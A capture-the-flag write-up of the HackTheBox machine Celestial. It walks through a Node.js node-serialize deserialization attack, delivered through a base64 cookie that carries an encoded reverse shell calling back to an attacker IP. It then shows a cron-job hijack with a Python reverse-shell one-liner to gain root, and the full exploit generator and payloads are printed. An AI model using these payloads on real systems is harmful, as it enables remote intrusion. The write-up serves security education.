---
title: HTB: Celestial
url: https://0xdf.gitlab.io/2018/08/25/htb-celestial.html
date: 2018-08-25T11:41:28+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, htb-celestial, ctf, nodejs, deserialization, htb-aragog, pspy, cron, oswe-like
---

Celestial is a fairly easy box that gives us a chance to play with deserialization vulnerabilities in Node.js. Weather it’s in struts, or python’s pickle, or in Node.js, deserialization of user input is almost always a bad idea, and here’s we’ll show why. To escalate, we’ll take advantage of a cron running the user’s code as root.

## Box Info

| Name | [Celestial](https://hackthebox.com/machines/celestial)  [Celestial](https://hackthebox.com/machines/celestial) [Play on HackTheBox](https://hackthebox.com/machines/celestial) |
| --- | --- |
| Release Date | 10 Mar 2018 |
| Retire Date | 04 May 2024 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Celestial |
| Radar Graph | Radar chart for Celestial |
| First Blood User | 00:19:29[yuntao yuntao](https://app.hackthebox.com/users/12438) |
| First Blood Root | 00:40:15[arkantolo arkantolo](https://app.hackthebox.com/users/1183) |
| Creator | [3ndG4me 3ndG4me](https://app.hackthebox.com/users/9652) |

## nmap

An nmap scan of the box shows port 3000 running http open:

```

root@kali# mkdir nmap; nmap -sC -sV -oA nmap/initial 10.10.10.85
Starting Nmap 7.70 ( https://nmap.org ) at 2018-04-01 20:19 EDT
Nmap scan report for 10.10.10.85
Host is up (0.10s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.76 seconds

```

nmap doesn’t tell us, but port 3000 is the default port for Node.js / Express.

## Web - port 3000

### Site

Visiting the site just gives a small response:

```

<h1>404</h1>

```

Looking a bit deeper with burp, that response is interesting:

```

HTTP/1.1 200 OK
X-Powered-By: Express
Set-Cookie: profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D; Max-Age=900; Path=/; Expires=Mon, 02 Apr 2018 00:47:44 GMT; HttpOnly
Content-Type: text/html; charset=utf-8
Content-Length: 12
ETag: W/"c-8lfvj2TmiRRvB7K+JPws1w9h6aY"
Date: Mon, 02 Apr 2018 00:32:44 GMT
Connection: close

<h1>404</h1>

```

Two things to note:
- “X-Powered-By: Express” - this is in line with our suspicious about port 3000 being Express.
- There’s a cookie set, and it looks base64 encoded.

On refresh, the page returns:

```

HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 21
ETag: W/"15-iqbh0nIIVq2tZl3LRUnGx4TH3xg"
Date: Mon, 02 Apr 2018 00:33:59 GMT
Connection: close

Hey Dummy 2 + 2 is 22

```

## NodeJS Deserialization

### Cookie Decode

The cookie set on the page is base64. Let’s decode:

```

root@kali# echo eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ== | base64 -d
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}

```

Change the number and resubmit, and get expected result:

```

root@kali# echo eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ== | base64 -d | sed 's/"2"/"5"/g' | base64 -w0

HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 21
ETag: W/"15-siRVVHgVZXIL4Rh1AHWdN5rJnA0"
Date: Mon, 02 Apr 2018 00:37:03 GMT
Connection: close

Hey Dummy 5 + 5 is 55

```

It is easy to make the page crash by messing with the parameters, giving it non-string values, etc.

### Deserialization Attack

This is a great blog post on deserialization in Node.js:

<https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/>

It also happens to provide a roadmap towards getting shell on Celestial.

#### Create Node Reverse Shell

We’ll use the nodejsshell.py to create a simple reverse shell in js:

```

root@kali# python /opt/Node.Js-Security-Course/nodejsshell.py 10.10.14.139 1337
[+] LHOST = 10.10.14.139
[+] LPORT = 1337
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,52,46,49,51,57,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))

```

To see what that code really is, we can easily decode:

```

>>> ints = [10,118,97,114,32,110,101,116,32,61...
>>> print(''.join([chr(x) for x in ints]))

var net = require('net');
var spawn = require('child_process').spawn;
HOST="10.10.14.139";
PORT="1337";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn('/bin/sh',[]);
        client.write("Connected!\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){
          client.end("Disconnected!\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}
c(HOST,PORT);

```

#### Generate Serialized Payload

Next we’ll create `exploit.js`, which will create the serialized payload by putting some wrapping around the shell we just created:

```

var y = {
  rce: function(){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,52,46,49,51,57,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}
}
var serialize = require('node-serialize');
var s = serialize.serialize(y)
console.log("Serialized: \n" + s.slice(0,-2) + "()" + s.slice(-2,));

```

This is the same format used in the blog post, though I added the slicing in the last line to add the “()”, where as he added it manually to the output.

Now run it with node to get the serialized output:

```

root@kali# nodejs exploit.js
Serialized:
{"rce":"_$$ND_FUNC$$_function (){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,52,46,49,51,57,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}

```

Finally, we’ll base64 encode that to get to the format of the cookie. I’ll use `tail -n +2` to drop the first line:

```

root@kali# nodejs exploit.js | tail -n +2 | base64 -w0
eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7ZXZhbChTdHJpbmcuZnJvbUNoYXJDb2RlKDEwLDExOCw5NywxMTQsMzIsMTEwLDEwMSwxMTYsMzIsNjEsMzIsMTE0LDEwMSwxMTMsMTE3LDEwNSwxMTQsMTAxLDQwLDM5LDExMCwxMDEsMTE2LDM5LDQxLDU5LDEwLDExOCw5NywxMTQsMzIsMTE1LDExMiw5NywxMTksMTEwLDMyLDYxLDMyLDExNCwxMDEsMTEzLDExNywxMDUsMTE0LDEwMSw0MCwzOSw5OSwxMDQsMTA1LDEwOCwxMDAsOTUsMTEyLDExNCwxMTEsOTksMTAxLDExNSwxMTUsMzksNDEsNDYsMTE1LDExMiw5NywxMTksMTEwLDU5LDEwLDcyLDc5LDgzLDg0LDYxLDM0LDQ5LDQ4LDQ2LDQ5LDQ4LDQ2LDQ5LDUyLDQ2LDQ5LDUxLDU3LDM0LDU5LDEwLDgwLDc5LDgyLDg0LDYxLDM0LDQ5LDUxLDUxLDU1LDM0LDU5LDEwLDg0LDczLDc3LDY5LDc5LDg1LDg0LDYxLDM0LDUzLDQ4LDQ4LDQ4LDM0LDU5LDEwLDEwNSwxMDIsMzIsNDAsMTE2LDEyMSwxMTIsMTAxLDExMSwxMDIsMzIsODMsMTE2LDExNCwxMDUsMTEwLDEwMyw0NiwxMTIsMTE0LDExMSwxMTYsMTExLDExNiwxMjEsMTEyLDEwMSw0Niw5OSwxMTEsMTEwLDExNiw5NywxMDUsMTEwLDExNSwzMiw2MSw2MSw2MSwzMiwzOSwxMTcsMTEwLDEwMCwxMDEsMTAyLDEwNSwxMTAsMTAxLDEwMCwzOSw0MSwzMiwxMjMsMzIsODMsMTE2LDExNCwxMDUsMTEwLDEwMyw0NiwxMTIsMTE0LDExMSwxMTYsMTExLDExNiwxMjEsMTEyLDEwMSw0Niw5OSwxMTEsMTEwLDExNiw5NywxMDUsMTEwLDExNSwzMiw2MSwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsMTA1LDExNiw0MSwzMiwxMjMsMzIsMTE0LDEwMSwxMTYsMTE3LDExNCwxMTAsMzIsMTE2LDEwNCwxMDUsMTE1LDQ2LDEwNSwxMTAsMTAwLDEwMSwxMjAsNzksMTAyLDQwLDEwNSwxMTYsNDEsMzIsMzMsNjEsMzIsNDUsNDksNTksMzIsMTI1LDU5LDMyLDEyNSwxMCwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsMzIsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDExOCw5NywxMTQsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiwzMiw2MSwzMiwxMTAsMTAxLDExOSwzMiwxMTAsMTAxLDExNiw0Niw4MywxMTEsOTksMTA3LDEwMSwxMTYsNDAsNDEsNTksMTAsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0Niw5OSwxMTEsMTEwLDExMCwxMDEsOTksMTE2LDQwLDgwLDc5LDgyLDg0LDQ0LDMyLDcyLDc5LDgzLDg0LDQ0LDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE4LDk3LDExNCwzMiwxMTUsMTA0LDMyLDYxLDMyLDExNSwxMTIsOTcsMTE5LDExMCw0MCwzOSw0Nyw5OCwxMDUsMTEwLDQ3LDExNSwxMDQsMzksNDQsOTEsOTMsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTksMTE0LDEwNSwxMTYsMTAxLDQwLDM0LDY3LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsMTAxLDEwMCwzMyw5MiwxMTAsMzQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTIsMTA1LDExMiwxMDEsNDAsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMDUsMTEwLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTExLDExNywxMTYsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMDEsMTE0LDExNCw0NiwxMTIsMTA1LDExMiwxMDEsNDAsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExMSwxMTAsNDAsMzksMTAxLDEyMCwxMDUsMTE2LDM5LDQ0LDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCw5OSwxMTEsMTAwLDEwMSw0NCwxMTUsMTA1LDEwMywxMTAsOTcsMTA4LDQxLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDEwMSwxMTAsMTAwLDQwLDM0LDY4LDEwNSwxMTUsOTksMTExLDExMCwxMTAsMTAxLDk5LDExNiwxMDEsMTAwLDMzLDkyLDExMCwzNCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTExLDExMCw0MCwzOSwxMDEsMTE0LDExNCwxMTEsMTE0LDM5LDQ0LDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCwxMDEsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDEsMTE2LDg0LDEwNSwxMDksMTAxLDExMSwxMTcsMTE2LDQwLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDgwLDc5LDgyLDg0LDQxLDQ0LDMyLDg0LDczLDc3LDY5LDc5LDg1LDg0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwxMjUsMTAsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsNTksMTApKX0oKSJ9Cg==

```

#### Submit Payload / Shell as sun

Use burp to intercept a web request and add our modified cookie. One submitting, the page returns:

```

HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 41
ETag: W/"29-mT0hiiE62mfFMAIMRMkQ7Q6tVaM"
Date: Mon, 02 Apr 2018 18:37:44 GMT
Connection: close

An error occurred...invalid username type

```

But at the same time:

```

root@kali# nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.14.139] from (UNKNOWN) [10.10.10.85] 50768
Connected!

python -c 'import pty;pty.spawn("/bin/bash")'
sun@sun:~$ id
uid=1000(sun) gid=1000(sun) groups=1000(sun),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)

```

### user.txt

Flag is easy to find in user directory:

```

sun@sun:~$ find . -name user.txt 2>/dev/null
./Documents/user.txt

sun@sun:~$ wc -c ./Documents/user.txt
33 ./Documents/user.txt

sun@sun:~$ cat ./Documents/user.txt
9a093cd2...

```

## Privesc: sun -> root

### Identifying cron

#### Manually

The home directory of sun has a bunch of files in it:

```

sun@sun:~$ ls -l
total 56
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Desktop
drwxr-xr-x  2 sun  sun  4096 Mar  4 15:08 Documents
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Downloads
-rw-r--r--  1 sun  sun  8980 Sep 19  2017 examples.desktop
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Music
drwxr-xr-x 47 root root 4096 Sep 19  2017 node_modules
-rw-r--r--  1 root root   21 Mar  4 15:40 output.txt
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Pictures
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Public
-rw-rw-r--  1 sun  sun   870 Sep 20  2017 server.js
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Templates
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Videos

```

Looking at the file modify times, it’s clear that output.txt is very recently updated. In fact, it’s being updated every 5 minutes:

```

sun@sun:~$ date
Mon Apr  2 14:49:32 EDT 2018

sun@sun:~$ ls -l output.txt
-rw-r--r-- 1 root root 21 Apr  2 14:45 output.txt

sun@sun:~$ date
Mon Apr  2 14:50:03 EDT 2018

sun@sun:~$ ls -l output.txt
-rw-r--r-- 1 root root 21 Apr  2 14:50 output.txt

sun@sun:~$ ls -l output.txt
ls -l output.txt
-rw-r--r-- 1 root root 21 Apr  2 14:55 output.txt

sun@sun:~$ cat output.txt
Script is running...

```

In the Documents directory next to user.txt, there’s a script.py that creates that output:

```

sun@sun:~/Documents$ ls
script.py  user.txt

sun@sun:~/Documents$ cat script.py
print "Script is running..."

```

#### With pspy

There are enough clues on this host that simple enumeration should tip us off to the cron. But, in other cases, we won’t be so lucky. This is a cool chance to show off an awesome tool, `pspy`. I gave a quick overview on how to install it in the [Aragog write-up](/2018/07/21/htb-aragog.html) . But let’s run it here just for kicks.

After using `python3 -m http.server 80` and wget from Celestial to move the pspy64 binary to the /tmp dir, we’ll run it. After spitting out a bunch of errors and then info on all the running processes, it stops and waits. When the 5 minute point comes around, here’s what we see:

```

2018/08/25 07:35:01 CMD: UID=0    PID=4784   |
2018/08/25 07:35:01 CMD: UID=0    PID=4783   | /bin/sh -c python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py
2018/08/25 07:35:01 CMD: UID=0    PID=4782   | /usr/sbin/CRON -f
2018/08/25 07:35:01 CMD: UID=0    PID=4785   |
2018/08/25 07:35:01 CMD: UID=0    PID=4786   | chown sun:sun /home/sun/Documents/script.py
2018/08/25 07:35:01 CMD: UID=0    PID=4787   | chattr -i /home/sun/Documents/script.py
2018/08/25 07:35:01 CMD: UID=???  PID=4788   | ???

```

I’ll look at the cron in the “Other Stuff” section at the end, but we basically get all of it right here. Very cool!

### Hijack cron / Shell as root

So, hijack that file. Create a python rev shell one liner. Save the original script so we can put it back when we’re done, and put ours into place:

```

sun@sun:~/Documents$ cat s
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.139",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

sun@sun:~/Documents$ mv script.py script.py.bk; mv s script.py;

```

And, when the cron runs, we get shell:

```

root@kali# nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.139] from (UNKNOWN) [10.10.10.85] 58248
/bin/sh: 0: can't access tty; job control turned off

# id
uid=0(root) gid=0(root) groups=0(root)

```

### root.txt

With shell, grab flag:

```

# pwd
/root

# ls
root.txt
script.py

# wc -c root.txt
33 root.txt

# cat root.txt
ba1d0019...

```

## Other Stuff

### server.js

The code for the server that was running is found in the sun homedir in `server.js`:

```

var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();
app.use(cookieParser())

app.get('/', function(req, res) {
 if (req.cookies.profile) {
   var str = new Buffer(req.cookies.profile, 'base64').toString();
   var obj = serialize.unserialize(str);
   if (obj.username) {
     var sum = eval(obj.num + obj.num);
     res.send("Hey " + obj.username + " " + obj.num + " + " + obj.num + " is " + sum);
   }else{
     res.send("An error occurred...invalid username type");
   }
}else {
     res.cookie('profile', "eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ==", {
       maxAge: 900000,
       httpOnly: true
     });
 }
 res.send("<h1>404</h1>");
});
app.listen(3000);

```

We can see how if there’s no cookie, it sets one and sends “404”, and how if there is, it uses `unserialize` and then reads values to make a string.

### cron

As root, we can see the cron job that is running `script.py`, and then copying the `script.py` from `/root` to reset it to it’s original value:

```

# crontab -l | grep -vF "#"
*/5 * * * * python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py

```

The cron also sets the timestamps on `script.py` to match `user.txt`, so that it’s not obvious that it’s being update regularly. To do this, it uses `date -R -r`, which returns the modification time on `user.txt` in RFC 5322 format. This is passed as an argument to `touch`, where the `-d` flag allows us to set the timestamp instead of using the current time.